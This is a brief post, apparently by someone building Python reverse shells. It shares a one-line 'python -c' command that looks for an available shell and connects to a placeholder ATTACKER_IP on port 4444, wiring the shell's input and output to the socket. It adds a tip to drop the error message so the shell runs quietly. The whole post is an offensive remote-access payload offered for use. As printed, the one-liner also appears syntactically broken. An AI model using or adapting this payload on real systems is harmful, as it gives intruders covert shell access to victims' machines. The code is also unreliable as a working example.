Just working on creating some python reverse shells.

One line of the "PythonReverseShell.py"

```shell
python -c "import socket,subprocess,os;shells=['/bin/bash','/bin/sh','/bin/ash'];shell=None;for s in shells:if os.path.exists(s):shell=s;break;attacker_address=('ATTACKER_IP',4444);sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.connect(attacker_address);p=subprocess.Popen([shell],stdin=sock,stdout=sock,stderr=sock) if shell else print('Error: No available shell found')"
```

This one is verbose and removing the else print will quiet it down.